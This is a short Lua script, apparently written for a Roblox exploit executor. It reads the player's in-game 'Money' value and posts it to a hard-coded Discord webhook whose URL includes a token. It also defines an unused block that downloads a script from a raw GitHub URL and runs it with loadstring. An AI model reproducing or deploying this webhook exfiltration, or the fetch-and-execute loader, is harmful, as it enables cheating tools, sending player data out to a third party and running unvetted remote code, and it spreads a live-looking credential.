local Players = game:GetService("Players")

-- Discord webhook URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1366018421711572992/TYeidqVzp8q69J4WiAYzYXBA33ka-_25jfONzMcOM44DE_1mxk89cIY9Tb3uUNg9GgTT"
local scriptToRun = [[
    -- Wait until the game is fully loaded
    game.Loaded:Wait()
 
    -- Once the game is loaded, run the external script
    wait(2)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/mrricky22/thingy/refs/heads/main/new.lua"))()
]]
-- Function to get local player's money
local function getLocalPlayerMoney()
    local player = Players.LocalPlayer
    if not player then
        warn("LocalPlayer not found")
        return 0
    end
    local leaderstats = player:FindFirstChild("leaderstats")
    if not leaderstats then
        warn("leaderstats not found")
        return 0
    end
    local cash = leaderstats:FindFirstChild("Money")
    if cash and cash:IsA("IntValue") then
        return cash.Value
    else
        warn("Money not found or not an IntValue")
        return 0
    end
end

-- Function to send local player's money to Discord webhook using executor's request function
local function sendMoneyToWebhook()
    local money = getLocalPlayerMoney()
    local message = {
        content = "Local Player Money: $" .. money
    }
    local jsonBody = game:GetService("HttpService"):JSONEncode(message) -- Use HttpService for JSON encoding
    local requestOptions = {
        Url = WEBHOOK_URL,
        Method = "POST",
        Body = jsonBody,
        Headers = {
            ["Content-Type"] = "application/json"
        }
    }
    local success, response = pcall(function()
        return request(requestOptions) -- Use executor's request function
    end)
    if success then
        if response.StatusCode == 200 or response.StatusCode == 204 then
            print("Webhook sent successfully: Status " .. response.StatusCode)
        else
            warn("Webhook failed with status: " .. response.StatusCode .. " - " .. (response.StatusMessage or "No message"))
        end
    else
        warn("Failed to send webhook: " .. tostring(response))
    end
end
wait(5)
sendMoneyToWebhook() -- Initial call
